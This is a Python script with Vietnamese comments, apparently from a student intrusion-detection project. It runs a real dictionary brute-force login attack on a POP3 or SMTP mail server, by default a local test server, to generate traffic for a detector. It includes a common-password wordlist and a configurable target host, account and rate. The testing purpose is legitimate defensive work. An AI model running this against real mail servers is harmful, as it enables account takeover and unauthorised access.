"""
brute_force.py
---------------
Kịch bản giả lập tấn công Brute-force THỰC SỰ kết nối mạng (khác với bản mock
cũ chỉ in log giả rồi ghi thẳng vào MySQL). Script này dùng poplib (và một
phương án SMTP) để tự động đăng nhập sai mật khẩu liên tục vào hMailServer
cục bộ (127.0.0.1), nhằm sinh ra lưu lượng POP3/SMTP thật cho
nids_engine/sniffer.py của Tiên bắt gói và tự phát hiện — script KHÔNG tự
ghi cảnh báo vào DB, việc đó là trách nhiệm của NIDS Engine.

Yêu cầu môi trường: hMailServer (hoặc server POP3/SMTP tương đương) đang
chạy trên TARGET_IP, với tài khoản TARGET_USER tồn tại thật (mật khẩu đúng
không quan trọng vì ta cố tình thử sai).

Cách chạy:
    python brute_force.py
    python brute_force.py --port 25 --attempts 20 --delay 0.5
    python brute_force.py --wordlist my_wordlist.txt --user admin@pbl4.local
"""

import argparse
import poplib
import smtplib
import socket
import sys
import time
from datetime import datetime

# ==========================================
# CẤU HÌNH MẶC ĐỊNH (giống normal_traffic.py / smtp_test.py)
# ==========================================
TARGET_IP = "127.0.0.1"        # Mail server test cục bộ (hMailServer)
POP3_PORT = 110
SMTP_PORT = 25
TARGET_USER = "admin@pbl4.local"

# Wordlist mật khẩu sai mặc định (dictionary attack cơ bản). Có thể thay
# bằng file riêng qua --wordlist (mỗi dòng một mật khẩu).
DEFAULT_WORDLIST = [
    "123456", "password", "admin123", "qwerty", "letmein",
    "welcome1", "pbl4@123", "mailserver", "iloveyou", "monkey",
    "abc123", "admin@123", "P@ssw0rd", "changeme1", "zxcvbnm",
]

CONNECT_TIMEOUT = 4  # giây, tránh treo script nếu server/port bị firewall chặn


def load_wordlist(path):
    if not path:
        return list(DEFAULT_WORDLIST)
    try:
        with open(path, "r", encoding="utf-8") as f:
            words = [line.strip() for line in f if line.strip()]
        return words or list(DEFAULT_WORDLIST)
    except OSError as e:
        print(f"[!] Không đọc được wordlist '{path}' ({e}), dùng danh sách mặc định.")
        return list(DEFAULT_WORDLIST)


def try_pop3_login(host, port, user, password):
    """Mở một kết nối POP3 thật và thử USER/PASS — trả về (ok, message)."""
    try:
        client = poplib.POP3(host, port, timeout=CONNECT_TIMEOUT)
        try:
            client.user(user)
            client.pass_(password)
            client.quit()
            return True, "+OK Authentication succeeded"
        except poplib.error_proto as e:
            try:
                client.quit()
            except Exception:
                pass
            return False, str(e)
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        return False, f"CONN_ERROR: {e}"


def try_smtp_login(host, port, user, password):
    """Phương án thay thế qua SMTP AUTH (nếu brute-force nhắm cổng 25)."""
    try:
        client = smtplib.SMTP(host, port, timeout=CONNECT_TIMEOUT)
        try:
            client.ehlo()
            client.login(user, password)
            client.quit()
            return True, "235 Authentication succeeded"
        except smtplib.SMTPAuthenticationError as e:
            try:
                client.quit()
            except Exception:
                pass
            return False, str(e)
        except smtplib.SMTPException as e:
            return False, str(e)
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        return False, f"CONN_ERROR: {e}"


def run_brute_force(host, port, user, wordlist, attempts, delay, protocol):
    print("==============================================")
    print("   BRUTE FORCE THẬT: POP3/SMTP DICTIONARY ATTACK")
    print("==============================================")
    print(f"[*] Mục tiêu: {host}:{port} ({protocol.upper()}) | Tài khoản: {user}")
    print(f"[*] Số lần thử tối đa: {attempts} | Độ trễ giữa các lần: {delay}s")
    rate_per_min = 60 / delay if delay > 0 else float("inf")
    print(f"[*] Tốc độ ước tính: ~{rate_per_min:.1f} lần/phút "
          f"(ngưỡng kích hoạt NIDS thường là > 5 lần/phút)\n")

    login_fn = try_pop3_login if protocol == "pop3" else try_smtp_login

    success = 0
    failures = 0
    blocked_detected = False

    for i in range(1, attempts + 1):
        password = wordlist[(i - 1) % len(wordlist)]
        stamp = datetime.now().strftime("%H:%M:%S")

        ok, message = login_fn(host, port, user, password)

        if ok:
            success += 1
            print(f"[{stamp}] #{i:02d} {user}:{password} -> THÀNH CÔNG ({message})")
            print("[!] Mật khẩu đúng được tìm thấy trong wordlist — dừng tấn công.")
            break

        if message.startswith("CONN_ERROR"):
            blocked_detected = True
            print(f"[{stamp}] #{i:02d} {user}:{password} -> KẾT NỐI BỊ TỪ CHỐI/TIMEOUT ({message})")
            print("[✓] Có thể NIDS/Firewall đã chặn IP này sau khi phát hiện brute-force. Dừng script.")
            break

        failures += 1
        print(f"[{stamp}] #{i:02d} {user}:{password} -> Thất bại ({message})")
        time.sleep(delay)

    print("\n[*] Kết thúc kịch bản brute-force.")
    print(f"[*] Tổng số lần thử thực hiện: {success + failures}")
    print(f"[*] Thất bại: {failures} | Thành công: {success} | Bị chặn giữa chừng: {blocked_detected}")
    print("[*] Kiểm tra Dashboard (AlertsTable) / bảng blocked_ips để xác nhận NIDS đã phát hiện.")


def parse_args():
    parser = argparse.ArgumentParser(description="Giả lập tấn công Brute-force POP3/SMTP (kết nối mạng thật).")
    parser.add_argument("--host", default=TARGET_IP, help="IP mail server mục tiêu (mặc định 127.0.0.1)")
    parser.add_argument("--protocol", choices=["pop3", "smtp"], default="pop3", help="Giao thức tấn công")
    parser.add_argument("--port", type=int, default=None, help="Cổng mục tiêu (mặc định 110 cho POP3, 25 cho SMTP)")
    parser.add_argument("--user", default=TARGET_USER, help="Tài khoản mục tiêu")
    parser.add_argument("--wordlist", default=None, help="Đường dẫn file wordlist (mỗi dòng 1 mật khẩu)")
    parser.add_argument("--attempts", type=int, default=15, help="Số lần thử tối đa")
    parser.add_argument("--delay", type=float, default=2.0,
                         help="Độ trễ (giây) giữa các lần thử; mặc định 2s => 30 lần/phút (> ngưỡng 5 lần/phút)")
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    port = args.port or (POP3_PORT if args.protocol == "pop3" else SMTP_PORT)
    words = load_wordlist(args.wordlist)
    try:
        run_brute_force(args.host, port, args.user, words, args.attempts, args.delay, args.protocol)
    except KeyboardInterrupt:
        sys.exit("\n[!] Đã dừng thủ công (Ctrl+C).")